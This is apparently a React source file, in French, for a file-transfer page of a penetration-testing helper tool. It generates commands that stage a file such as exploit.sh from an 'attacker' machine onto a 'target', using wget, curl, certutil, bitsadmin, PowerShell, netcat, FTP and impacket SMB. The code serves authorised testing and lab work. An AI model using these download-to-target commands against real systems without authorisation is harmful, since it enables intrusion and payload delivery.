import React, { useEffect, useMemo, useRef, useState } from 'react';
import { toast } from 'react-hot-toast';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import {
  Server,
  MonitorSmartphone,
  Upload,
  Download,
  Globe,
  FileText,
  Shield,
  Network,
  Folder,
  Copy,
  Trash2,
  ChevronDown,
  ChevronUp,
} from 'lucide-react';

type OSEnum = 'linux' | 'windows' | 'macos';

interface ScenarioState {
  attacker: {
    os: OSEnum;
    ip: string;
    port: string; // listen port (HTTP/NC/FTP)
  };
  target: {
    os: OSEnum;
    ip: string;
    sshPort: string; // for scp/sftp
    filename: string;
    destPath: string; // folder or full path
  };
}

interface HistoryItem {
  id: string;
  method: string;
  step: string;
  command: string;
  context: any;
  createdAt: string;
}

const STORAGE_KEY_HISTORY = 'fileTransferHistory';

function buildDestFullPath(destPath: string, filename: string, os: OSEnum): string {
  const isWindows = os === 'windows';
  const sep = isWindows ? '\\' : '/';
  if (!destPath) return isWindows ? `C:\\temp\\${filename}` : `/tmp/${filename}`;
  const endsWithSep = isWindows ? /\\$/.test(destPath) : /\/$/.test(destPath);
  return endsWithSep ? `${destPath}${filename}` : `${destPath}${sep}${filename}`;
}

function copyToClipboard(cmd: string) {
  navigator.clipboard.writeText(cmd).then(() => {
    toast.success('Commande copiée');
  }).catch(() => toast.error('Copie impossible'));
}

const SectionHeader: React.FC<{ title: string; right?: React.ReactNode }> = ({ title, right }) => (
  <div className="flex items-center justify-between mb-3">
    <h3 className="text-lg font-semibold text-slate-100">{title}</h3>
    {right}
  </div>
);

export const FileTransferPage: React.FC = () => {
  // Scénario appliqué (utilisé pour générer les commandes)
  const [scenario, setScenario] = useState<ScenarioState>({
    attacker: { os: 'linux', ip: '10.10.14.1', port: '8000' },
    target: { os: 'linux', ip: '10.10.10.10', sshPort: '22', filename: 'exploit.sh', destPath: '/tmp' },
  });
  // Brouillon (modifications en cours avant d'appuyer sur "Générer")
  const [draftScenario, setDraftScenario] = useState<ScenarioState>(() => ({ ...scenario }));
  const [showScenarioContent, setShowScenarioContent] = useState(false);

  const [expanded, setExpanded] = useState<Record<string, boolean>>({
    http: true,
    scp: false,
    netcat: false,
    base64: false,
    ftp: false,
    smb: false,
  });

  const [history, setHistory] = useState<HistoryItem[]>(() => {
    try {
      const raw = localStorage.getItem(STORAGE_KEY_HISTORY);
      return raw ? JSON.parse(raw) : [];
    } catch {
      return [];
    }
  });

  useEffect(() => {
    localStorage.setItem(STORAGE_KEY_HISTORY, JSON.stringify(history));
  }, [history]);

  const attackerLabel = useMemo(() => {
    return scenario.attacker.os === 'windows' ? 'ATTACKBOX (Windows)' : scenario.attacker.os === 'macos' ? 'ATTACKBOX (macOS)' : 'ATTACKBOX (Linux)';
  }, [scenario.attacker.os]);

  const targetLabel = useMemo(() => {
    return scenario.target.os === 'windows' ? 'TARGET (Windows)' : scenario.target.os === 'macos' ? 'TARGET (macOS)' : 'TARGET (Linux)';
  }, [scenario.target.os]);

  const destFullPath = buildDestFullPath(scenario.target.destPath, scenario.target.filename, scenario.target.os);

  function onCopy(method: string, step: string, command: string) {
    copyToClipboard(command);
    setHistory((prev) => [
      {
        id: Date.now().toString(),
        method,
        step,
        command,
        context: scenario,
        createdAt: new Date().toISOString(),
      },
      ...prev,
    ]);
  }

  function exportHistory() {
    const blob = new Blob([JSON.stringify(history, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'file-transfer-history.json';
    a.click();
    URL.revokeObjectURL(url);
  }

  function importHistory(file: File) {
    const reader = new FileReader();
    reader.onload = () => {
      try {
        const data = JSON.parse(String(reader.result));
        if (Array.isArray(data)) setHistory(data as HistoryItem[]);
      } catch {
        toast.error('Fichier invalide');
      }
    };
    reader.readAsText(file);
  }

  const fileInputRef = useRef<HTMLInputElement | null>(null);

  // Command templates
  const httpServerPython3 = `python3 -m http.server ${scenario.attacker.port} --bind 0.0.0.0`;
  const httpServerPython2 = `python -m SimpleHTTPServer ${scenario.attacker.port}`;
  const httpServerPHP = `php -S 0.0.0.0:${scenario.attacker.port}`;
  const httpServerRuby = `ruby -run -e httpd . -p ${scenario.attacker.port}`;
  const httpServerNode = `npx http-server -p ${scenario.attacker.port} --host 0.0.0.0`;

  const httpURL = `http://${scenario.attacker.ip}:${scenario.attacker.port}/${scenario.target.filename}`;
  const wgetCmd = `wget "${httpURL}" -O "${destFullPath}"`;
  const curlCmd = `curl -o "${destFullPath}" "${httpURL}"`;
  const pwshCmd = `Invoke-WebRequest -Uri "${httpURL}" -OutFile "${destFullPath.replace(/\\/g, '\\\\')}"`;
  const certutilCmd = `certutil -urlcache -split -f "${httpURL}" "${destFullPath.replace(/\\/g, '\\\\')}"`;
  const bitsadminCmd = `bitsadmin /transfer myDownloadJob /download /priority normal "${httpURL}" "${destFullPath.replace(/\\/g, '\\\\')}"`;

  const scpToTarget = `scp "${scenario.target.filename}" ${'user'}@${scenario.target.ip}:"${destFullPath}"`;
  const scpCustomPort = `scp -P ${scenario.target.sshPort} "${scenario.target.filename}" ${'user'}@${scenario.target.ip}:"${destFullPath}"`;
  const sftpInteractive = `sftp ${'user'}@${scenario.target.ip}`;

  const ncReceiver = scenario.target.os === 'windows'
    ? `ncat -l -p ${scenario.attacker.port} > "${destFullPath.replace(/\\/g, '\\\\')}"`
    : `nc -l -p ${scenario.attacker.port} > "${destFullPath}"`;
  const ncSender = (scenario.target.os === 'windows'
    ? `ncat ${scenario.target.ip} ${scenario.attacker.port} < "${scenario.target.filename.replace(/\\/g, '\\\\')}"`
    : `nc ${scenario.target.ip} ${scenario.attacker.port} < "${scenario.target.filename}"`);
  const ncTimeout = `timeout 30 ${ncSender}`;

  const b64EncodeLinux = `base64 -w 0 "${scenario.target.filename}"`;
  const b64EncodeWindows = `certutil -encode "${scenario.target.filename.replace(/\\/g, '\\\\')}" encoded.txt`;
  const b64DecodeLinux = `echo "BASE64_STRING" | base64 -d > "${destFullPath}"`;
  const b64DecodeWindows = `certutil -decode encoded.txt "${destFullPath.replace(/\\/g, '\\\\')}"`;

  const ftpServer = `python3 -m pyftpdlib -p 21 -w`;
  const ftpServerAuth = `python3 -m pyftpdlib -p 21 -u user -P pass`;
  const ftpClientLinux = `wget ftp://${scenario.attacker.ip}/${scenario.target.filename} -O "${destFullPath}"`;
  const ftpClientWindows = `powershell -c "(New-Object Net.WebClient).DownloadFile('ftp://${scenario.attacker.ip}/${scenario.target.filename}', '${destFullPath.replace(/\\/g, '\\\\')}')"`;

  const smbServer = `impacket-smbserver share . -smb2support`;
  const smbServerAuth = `impacket-smbserver share . -smb2support -user user -password pass`;
  const smbCopy = `copy "\\\\${scenario.attacker.ip}\\share\\${scenario.target.filename}" "${destFullPath.replace(/\\/g, '\\\\')}"`;
  const smbRobocopy = `robocopy "\\\\${scenario.attacker.ip}\\share" "${(scenario.target.destPath || 'C:\\temp').replace(/\\/g, '\\\\')}" "${scenario.target.filename}"`;

  return (
    <div className="app-layout">
      {/* Header */}
      <div className="main-header p-6">
        <div className="flex-between mb-6">
          <div className="flex items-center gap-3">
            <div className="flex items-center gap-3">
              <img src="/logo.png" alt="AuditMapper" className="w-8 h-8 rounded-lg opacity-80" />
              <div>
                <h1 className="text-2xl font-bold text-slate-100">Transfert de Fichiers</h1>
                <p className="text-slate-400">Techniques claires et commandes pré-remplies selon votre scénario</p>
              </div>
            </div>
          </div>
        </div>

        {/* Scenario configuration (compact + repliable) */}
        <Card className="border-slate-700 bg-slate-800">
          <CardHeader>
            <div className="flex items-center justify-between">
              <CardTitle className="text-slate-100">🎯 Configuration du Scénario</CardTitle>
              <div className="flex items-center gap-2">
                <div className="hidden md:block text-xs text-slate-400 mr-2">
                  {scenario.attacker.ip}:{scenario.attacker.port} → {scenario.target.ip} • {scenario.target.filename} → {destFullPath}
                </div>
                <Button
                  variant="outline"
                  size="sm"
                  className="bg-blue-600 hover:bg-blue-700 text-white border-blue-600"
                  onClick={() => {
                    setScenario({ ...draftScenario });
                    toast.success('Commandes générées');
                  }}
                >
                  🚀 Générer les Commandes
                </Button>
                <Button
                  variant="outline"
                  size="sm"
                  className="bg-slate-700 border-slate-600 text-slate-200 hover:bg-slate-600"
                  onClick={() => setShowScenarioContent((v) => !v)}
                >
                  {showScenarioContent ? 'Masquer' : 'Modifier'}
                </Button>
              </div>
            </div>
          </CardHeader>
          {showScenarioContent && (
          <CardContent>
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
              {/* Attacker */}
              <Card className="border-slate-700 bg-slate-800">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2 text-slate-100">
                    <MonitorSmartphone className="w-4 h-4" /> Machine Attaquant
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-2">
                  <div>
                    <label className="text-sm text-slate-400">OS</label>
                    <Select value={draftScenario.attacker.os} onValueChange={(v: OSEnum) => setDraftScenario((s) => ({...s, attacker: {...s.attacker, os: v}}))}>
                      <SelectTrigger className="mt-1 h-9 bg-slate-700 border-slate-600 text-slate-100"><SelectValue /></SelectTrigger>
                      <SelectContent className="bg-slate-800 border-slate-600">
                        <SelectItem value="linux">🐧 Linux</SelectItem>
                        <SelectItem value="windows">🪟 Windows</SelectItem>
                        <SelectItem value="macos">🍎 macOS</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>
                  <div>
                    <label className="text-sm text-slate-400">Adresse IP</label>
                    <Input value={draftScenario.attacker.ip} onChange={(e) => setDraftScenario((s) => ({...s, attacker: {...s.attacker, ip: e.target.value}}))} className="mt-1 h-9 bg-slate-700 border-slate-600 text-slate-100" />
                  </div>
                  <div>
                    <label className="text-sm text-slate-400">Port d'écoute (HTTP/Netcat)</label>
                    <Input value={draftScenario.attacker.port} onChange={(e) => setDraftScenario((s) => ({...s, attacker: {...s.attacker, port: e.target.value}}))} className="mt-1 h-9 bg-slate-700 border-slate-600 text-slate-100" />
                  </div>
                </CardContent>
              </Card>

              {/* middle arrow */}
              <div className="hidden lg:flex items-center justify-center">
                <div className="text-slate-300 text-4xl">➡️</div>
              </div>

              {/* Target */}
              <Card className="border-slate-700 bg-slate-800">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2 text-slate-100">
                    <TargetIcon /> Machine Cible
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-2">
                  <div>
                    <label className="text-sm text-slate-400">OS</label>
                    <Select value={draftScenario.target.os} onValueChange={(v: OSEnum) => setDraftScenario((s) => ({...s, target: {...s.target, os: v}}))}>
                      <SelectTrigger className="mt-1 h-9 bg-slate-700 border-slate-600 text-slate-100"><SelectValue /></SelectTrigger>
                      <SelectContent className="bg-slate-800 border-slate-600">
                        <SelectItem value="linux">🐧 Linux</SelectItem>
                        <SelectItem value="windows">🪟 Windows</SelectItem>
                        <SelectItem value="macos">🍎 macOS</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                    <div>
                      <label className="text-sm text-slate-400">IP de la cible</label>
                      <Input value={draftScenario.target.ip} onChange={(e) => setDraftScenario((s) => ({...s, target: {...s.target, ip: e.target.value}}))} className="mt-1 h-9 bg-slate-700 border-slate-600 text-slate-100" />
                    </div>
                    <div>
                      <label className="text-sm text-slate-400">Port SSH</label>
                      <Input value={draftScenario.target.sshPort} onChange={(e) => setDraftScenario((s) => ({...s, target: {...s.target, sshPort: e.target.value}}))} className="mt-1 h-9 bg-slate-700 border-slate-600 text-slate-100" />
                    </div>
                  </div>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                    <div>
                      <label className="text-sm text-slate-400">Nom du fichier</label>
                      <Input value={draftScenario.target.filename} onChange={(e) => setDraftScenario((s) => ({...s, target: {...s.target, filename: e.target.value}}))} className="mt-1 h-9 bg-slate-700 border-slate-600 text-slate-100" />
                    </div>
                    <div>
                      <label className="text-sm text-slate-400">Destination</label>
                      <Input value={draftScenario.target.destPath} onChange={(e) => setDraftScenario((s) => ({...s, target: {...s.target, destPath: e.target.value}}))} className="mt-1 h-9 bg-slate-700 border-slate-600 text-slate-100" />
                    </div>
                  </div>
                  <div className="text-xs text-slate-400">Chemin final (brouillon): <code className="text-slate-200">{buildDestFullPath(draftScenario.target.destPath, draftScenario.target.filename, draftScenario.target.os)}</code></div>
                  <div className="flex items-center gap-2 pt-2">
                    <Button
                      variant="default"
                      className="bg-blue-600 hover:bg-blue-700"
                      onClick={() => {
                        setScenario({ ...draftScenario });
                        setShowScenarioContent(false);
                        toast.success('Commandes générées');
                      }}
                    >
                      🚀 Générer les Commandes
                    </Button>
                    <Button
                      variant="outline"
                      className="bg-slate-700 border-slate-600 text-slate-200 hover:bg-slate-600"
                      onClick={() => setDraftScenario({
                        attacker: { os: 'linux', ip: '10.10.14.1', port: '8000' },
                        target: { os: 'linux', ip: '10.10.10.10', sshPort: '22', filename: 'exploit.sh', destPath: '/tmp' },
                      })}
                    >
                      🔄 Réinitialiser
                    </Button>
                  </div>
                </CardContent>
              </Card>
            </div>
          </CardContent>
          )}
        </Card>
      </div>

      {/* Main content */}
      <div className="main-content">
        <div className="content-area">
          <div className="content-main p-6 space-y-6">
            <SectionHeader
              title="📋 Méthodes de Transfert Disponibles"
              right={
                <div className="flex gap-2">
                  <Button variant="outline" size="sm" className="bg-slate-700 border-slate-600 text-slate-200 hover:bg-slate-600" onClick={() => setExpanded({ http: true, scp: true, netcat: true, base64: true, ftp: true, smb: true })}>📖 Tout déplier</Button>
                  <Button variant="outline" size="sm" className="bg-slate-700 border-slate-600 text-slate-200 hover:bg-slate-600" onClick={() => setExpanded({ http: false, scp: false, netcat: false, base64: false, ftp: false, smb: false })}>📕 Tout replier</Button>
                </div>
              }
            />

            {/* HTTP */}
            <Card className="border-slate-700 bg-slate-800">
              <CardHeader>
                <div className="flex items-center justify-between">
                  <CardTitle className="flex items-center gap-2 text-slate-100"><Globe className="w-4 h-4" /> Serveur HTTP</CardTitle>
                  <Button variant="outline" size="sm" className="bg-slate-700 border-slate-600 text-slate-200 hover:bg-slate-600" onClick={() => setExpanded((e) => ({...e, http: !e.http}))}>
                    {expanded.http ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                  </Button>
                </div>
              </CardHeader>
              {expanded.http && (
              <CardContent className="space-y-4">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="p-3 bg-slate-700/30 rounded border border-slate-600">
                    <div className="text-xs font-semibold text-slate-300 mb-2">🖥️ {attackerLabel}</div>
                    <div className="space-y-2">
                      {[{label: 'Python 3 (recommandé)', cmd: httpServerPython3}, {label: 'Python 2 (legacy)', cmd: httpServerPython2}, {label: 'PHP', cmd: httpServerPHP}, {label: 'Ruby', cmd: httpServerRuby}, {label: 'Node.js', cmd: httpServerNode}].map(({label, cmd}) => (
                        <div key={label} className="bg-slate-800 rounded border border-slate-600">
                          <div className="flex items-center justify-between px-2 py-1 border-b border-slate-700">
                            <span className="text-xs text-slate-400">{label}</span>
                            <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('http', 'attacker', cmd)}><Copy className="w-3 h-3" /></Button>
                          </div>
                          <pre className="p-2 text-xs text-slate-200 overflow-x-auto"><code>{cmd}</code></pre>
                        </div>
                      ))}
                    </div>
                  </div>
                  <div className="p-3 bg-slate-700/30 rounded border border-slate-600">
                    <div className="text-xs font-semibold text-slate-300 mb-2">🎯 {targetLabel}</div>
                    <div className="space-y-2">
                      {(scenario.target.os === 'windows' ? [
                        {label: 'PowerShell (Windows)', cmd: pwshCmd},
                        {label: 'certutil (Windows)', cmd: certutilCmd},
                        {label: 'bitsadmin (Windows)', cmd: bitsadminCmd},
                      ] : [
                        {label: 'wget (Linux/macOS)', cmd: wgetCmd},
                        {label: 'curl (Linux/macOS)', cmd: curlCmd},
                      ]).map(({label, cmd}) => (
                        <div key={label} className="bg-slate-800 rounded border border-slate-600">
                          <div className="flex items-center justify-between px-2 py-1 border-b border-slate-700">
                            <span className="text-xs text-slate-400">{label}</span>
                            <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('http', 'target', cmd)}><Copy className="w-3 h-3" /></Button>
                          </div>
                          <pre className="p-2 text-xs text-slate-200 overflow-x-auto"><code>{cmd}</code></pre>
                        </div>
                      ))}
                    </div>
                  </div>
                </div>
              </CardContent>
              )}
            </Card>

            {/* SCP/SFTP */}
            <Card className="border-slate-700 bg-slate-800">
              <CardHeader>
                <div className="flex items-center justify-between">
                  <CardTitle className="flex items-center gap-2 text-slate-100"><Shield className="w-4 h-4" /> SCP / SFTP</CardTitle>
                  <Button variant="outline" size="sm" className="bg-slate-700 border-slate-600 text-slate-200 hover:bg-slate-600" onClick={() => setExpanded((e) => ({...e, scp: !e.scp}))}>
                    {expanded.scp ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                  </Button>
                </div>
              </CardHeader>
              {expanded.scp && (
              <CardContent className="space-y-2">
                <div className="p-3 bg-slate-700/30 rounded border border-slate-600">
                  <div className="text-xs font-semibold text-slate-300 mb-2">🖥️ {attackerLabel}</div>
                  <div className="space-y-2">
                    {[{label: 'SCP vers la cible', cmd: scpToTarget}, {label: 'SCP avec port personnalisé', cmd: scpCustomPort}, {label: 'SFTP interactif', cmd: sftpInteractive}].map(({label, cmd}) => (
                      <div key={label} className="bg-slate-800 rounded border border-slate-600">
                        <div className="flex items-center justify-between px-2 py-1 border-b border-slate-700">
                          <span className="text-xs text-slate-400">{label}</span>
                          <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('scp', 'attacker', cmd)}><Copy className="w-3 h-3" /></Button>
                        </div>
                        <pre className="p-2 text-xs text-slate-200 overflow-x-auto"><code>{cmd}</code></pre>
                      </div>
                    ))}
                  </div>
                  <div className="mt-2 text-xs text-slate-400">Remplacez <code>user</code> par un utilisateur valide. Assurez-vous que SSH est actif sur la cible.</div>
                </div>
              </CardContent>
              )}
            </Card>

            {/* Netcat */}
            <Card className="border-slate-700 bg-slate-800">
              <CardHeader>
                <div className="flex items-center justify-between">
                  <CardTitle className="flex items-center gap-2 text-slate-100"><Network className="w-4 h-4" /> Netcat</CardTitle>
                  <Button variant="outline" size="sm" className="bg-slate-700 border-slate-600 text-slate-200 hover:bg-slate-600" onClick={() => setExpanded((e) => ({...e, netcat: !e.netcat}))}>
                    {expanded.netcat ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                  </Button>
                </div>
              </CardHeader>
              {expanded.netcat && (
              <CardContent className="space-y-4">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="p-3 bg-slate-700/30 rounded border border-slate-600">
                    <div className="text-xs font-semibold text-slate-300 mb-2">🎯 {targetLabel} (récepteur)</div>
                    <div className="bg-slate-800 rounded border border-slate-600">
                      <div className="flex items-center justify-between px-2 py-1 border-b border-slate-700">
                        <span className="text-xs text-slate-400">Netcat récepteur</span>
                        <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('netcat', 'target', ncReceiver)}><Copy className="w-3 h-3" /></Button>
                      </div>
                      <pre className="p-2 text-xs text-slate-200 overflow-x-auto"><code>{ncReceiver}</code></pre>
                    </div>
                  </div>
                  <div className="p-3 bg-slate-700/30 rounded border border-slate-600">
                    <div className="text-xs font-semibold text-slate-300 mb-2">🖥️ {attackerLabel} (envoyeur)</div>
                    {[{label: 'Netcat envoyeur', cmd: ncSender}, {label: 'Avec timeout', cmd: ncTimeout}].map(({label, cmd}) => (
                      <div key={label} className="bg-slate-800 rounded border border-slate-600 mb-2">
                        <div className="flex items-center justify-between px-2 py-1 border-b border-slate-700">
                          <span className="text-xs text-slate-400">{label}</span>
                          <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('netcat', 'attacker', cmd)}><Copy className="w-3 h-3" /></Button>
                        </div>
                        <pre className="p-2 text-xs text-slate-200 overflow-x-auto"><code>{cmd}</code></pre>
                      </div>
                    ))}
                  </div>
                </div>
              </CardContent>
              )}
            </Card>

            {/* Base64 */}
            <Card className="border-slate-700 bg-slate-800">
              <CardHeader>
                <div className="flex items-center justify-between">
                  <CardTitle className="flex items-center gap-2 text-slate-100"><FileText className="w-4 h-4" /> Base64</CardTitle>
                  <Button variant="outline" size="sm" className="bg-slate-700 border-slate-600 text-slate-200 hover:bg-slate-600" onClick={() => setExpanded((e) => ({...e, base64: !e.base64}))}>
                    {expanded.base64 ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                  </Button>
                </div>
              </CardHeader>
              {expanded.base64 && (
              <CardContent className="space-y-4">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="p-3 bg-slate-700/30 rounded border border-slate-600">
                    <div className="text-xs font-semibold text-slate-300 mb-2">🖥️ {attackerLabel}</div>
                    <div className="space-y-2">
                      {[{label: 'Encoder en base64 (Linux/macOS)', cmd: b64EncodeLinux}, {label: 'Encoder en base64 (Windows)', cmd: b64EncodeWindows}].map(({label, cmd}) => (
                        <div key={label} className="bg-slate-800 rounded border border-slate-600">
                          <div className="flex items-center justify-between px-2 py-1 border-b border-slate-700">
                            <span className="text-xs text-slate-400">{label}</span>
                            <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('base64', 'attacker', cmd)}><Copy className="w-3 h-3" /></Button>
                          </div>
                          <pre className="p-2 text-xs text-slate-200 overflow-x-auto"><code>{cmd}</code></pre>
                        </div>
                      ))}
                    </div>
                  </div>
                  <div className="p-3 bg-slate-700/30 rounded border border-slate-600">
                    <div className="text-xs font-semibold text-slate-300 mb-2">🎯 {targetLabel}</div>
                    <div className="space-y-2">
                      {[{label: 'Décoder base64 (Linux/macOS)', cmd: b64DecodeLinux}, {label: 'Décoder base64 (Windows)', cmd: b64DecodeWindows}].map(({label, cmd}) => (
                        <div key={label} className="bg-slate-800 rounded border border-slate-600">
                          <div className="flex items-center justify-between px-2 py-1 border-b border-slate-700">
                            <span className="text-xs text-slate-400">{label}</span>
                            <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('base64', 'target', cmd)}><Copy className="w-3 h-3" /></Button>
                          </div>
                          <pre className="p-2 text-xs text-slate-200 overflow-x-auto"><code>{cmd}</code></pre>
                        </div>
                      ))}
                    </div>
                  </div>
                </div>
              </CardContent>
              )}
            </Card>

            {/* FTP */}
            <Card className="border-slate-700 bg-slate-800">
              <CardHeader>
                <div className="flex items-center justify-between">
                  <CardTitle className="flex items-center gap-2 text-slate-100"><Folder className="w-4 h-4" /> FTP</CardTitle>
                  <Button variant="outline" size="sm" className="bg-slate-700 border-slate-600 text-slate-200 hover:bg-slate-600" onClick={() => setExpanded((e) => ({...e, ftp: !e.ftp}))}>
                    {expanded.ftp ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                  </Button>
                </div>
              </CardHeader>
              {expanded.ftp && (
              <CardContent className="space-y-4">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="p-3 bg-slate-700/30 rounded border border-slate-600">
                    <div className="text-xs font-semibold text-slate-300 mb-2">🖥️ {attackerLabel}</div>
                    <div className="space-y-2">
                      {[{label: 'Python FTP Server', cmd: ftpServer}, {label: 'FTP avec authentification', cmd: ftpServerAuth}].map(({label, cmd}) => (
                        <div key={label} className="bg-slate-800 rounded border border-slate-600">
                          <div className="flex items-center justify-between px-2 py-1 border-b border-slate-700">
                            <span className="text-xs text-slate-400">{label}</span>
                            <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('ftp', 'attacker', cmd)}><Copy className="w-3 h-3" /></Button>
                          </div>
                          <pre className="p-2 text-xs text-slate-200 overflow-x-auto"><code>{cmd}</code></pre>
                        </div>
                      ))}
                    </div>
                  </div>
                  <div className="p-3 bg-slate-700/30 rounded border border-slate-600">
                    <div className="text-xs font-semibold text-slate-300 mb-2">🎯 {targetLabel}</div>
                    <div className="space-y-2">
                      {[{label: 'FTP client (Linux)', cmd: ftpClientLinux}, {label: 'FTP client (Windows)', cmd: ftpClientWindows}].map(({label, cmd}) => (
                        <div key={label} className="bg-slate-800 rounded border border-slate-600">
                          <div className="flex items-center justify-between px-2 py-1 border-b border-slate-700">
                            <span className="text-xs text-slate-400">{label}</span>
                            <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('ftp', 'target', cmd)}><Copy className="w-3 h-3" /></Button>
                          </div>
                          <pre className="p-2 text-xs text-slate-200 overflow-x-auto"><code>{cmd}</code></pre>
                        </div>
                      ))}
                    </div>
                  </div>
                </div>
              </CardContent>
              )}
            </Card>

            {/* SMB */}
            <Card className="border-slate-700 bg-slate-800">
              <CardHeader>
                <div className="flex items-center justify-between">
                  <CardTitle className="flex items-center gap-2 text-slate-100"><Server className="w-4 h-4" /> SMB</CardTitle>
                  <Button variant="outline" size="sm" className="bg-slate-700 border-slate-600 text-slate-200 hover:bg-slate-600" onClick={() => setExpanded((e) => ({...e, smb: !e.smb}))}>
                    {expanded.smb ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                  </Button>
                </div>
              </CardHeader>
              {expanded.smb && (
              <CardContent className="space-y-4">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="p-3 bg-slate-700/30 rounded border border-slate-600">
                    <div className="text-xs font-semibold text-slate-300 mb-2">🖥️ {attackerLabel}</div>
                    <div className="space-y-2">
                      {[{label: 'Impacket SMB Server', cmd: smbServer}, {label: 'SMB avec authentification', cmd: smbServerAuth}].map(({label, cmd}) => (
                        <div key={label} className="bg-slate-800 rounded border border-slate-600">
                          <div className="flex items-center justify-between px-2 py-1 border-b border-slate-700">
                            <span className="text-xs text-slate-400">{label}</span>
                            <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('smb', 'attacker', cmd)}><Copy className="w-3 h-3" /></Button>
                          </div>
                          <pre className="p-2 text-xs text-slate-200 overflow-x-auto"><code>{cmd}</code></pre>
                        </div>
                      ))}
                    </div>
                  </div>
                  <div className="p-3 bg-slate-700/30 rounded border border-slate-600">
                    <div className="text-xs font-semibold text-slate-300 mb-2">🎯 {targetLabel} (Windows)</div>
                    <div className="space-y-2">
                      {[{label: 'Copie depuis SMB', cmd: smbCopy}, {label: 'Robocopy (plus robuste)', cmd: smbRobocopy}].map(({label, cmd}) => (
                        <div key={label} className="bg-slate-800 rounded border border-slate-600">
                          <div className="flex items-center justify-between px-2 py-1 border-b border-slate-700">
                            <span className="text-xs text-slate-400">{label}</span>
                            <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('smb', 'target', cmd)}><Copy className="w-3 h-3" /></Button>
                          </div>
                          <pre className="p-2 text-xs text-slate-200 overflow-x-auto"><code>{cmd}</code></pre>
                        </div>
                      ))}
                    </div>
                  </div>
                </div>
              </CardContent>
              )}
            </Card>

            {/* History */}
            <Card className="border-slate-700 bg-slate-800">
              <CardHeader>
                <div className="flex items-center justify-between">
                  <CardTitle className="text-slate-100">📋 Historique des Commandes</CardTitle>
                  <div className="flex gap-2">
                    <Button variant="outline" size="sm" className="bg-slate-700 border-slate-600 text-slate-200 hover:bg-slate-600" onClick={() => setHistory([])} title="Vider"><Trash2 className="w-4 h-4" /></Button>
                    <Button variant="outline" size="sm" className="bg-slate-700 border-slate-600 text-slate-200 hover:bg-slate-600" onClick={exportHistory} title="Exporter"><Download className="w-4 h-4" /></Button>
                    <input ref={fileInputRef} type="file" accept="application/json" className="hidden" onChange={(e) => {
                      const f = e.target.files?.[0];
                      if (f) importHistory(f);
                      e.currentTarget.value = '';
                    }} />
                    <Button variant="outline" size="sm" className="bg-slate-700 border-slate-600 text-slate-200 hover:bg-slate-600" onClick={() => fileInputRef.current?.click()} title="Importer"><Upload className="w-4 h-4" /></Button>
                  </div>
                </div>
              </CardHeader>
              <CardContent>
                {history.length === 0 ? (
                  <div className="text-slate-400 text-sm">Aucune commande copiée. Les copies apparaissent ici avec contexte et horodatage.</div>
                ) : (
                  <div className="space-y-2 max-h-[260px] overflow-y-auto">
                    {history.map((h) => (
                      <div key={h.id} className="p-2 bg-slate-700/40 rounded border border-slate-600">
                        <div className="flex items-center justify-between text-xs text-slate-400">
                          <span>{new Date(h.createdAt).toLocaleString('fr-FR')}</span>
                          <span className="uppercase">{h.method} • {h.step}</span>
                        </div>
                        <pre className="text-xs text-slate-200 overflow-x-auto mt-1"><code>{h.command}</code></pre>
                      </div>
                    ))}
                  </div>
                )}
              </CardContent>
            </Card>
          </div>
        </div>
      </div>
    </div>
  );
};

// Minimal icon for Target to avoid extra import
const TargetIcon: React.FC = () => (
  <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="lucide lucide-crosshair">
    <circle cx="12" cy="12" r="10"></circle>
    <line x1="22" x2="18" y1="12" y2="12"></line>
    <line x1="6" x2="2" y1="12" y2="12"></line>
    <line x1="12" x2="12" y1="6" y2="2"></line>
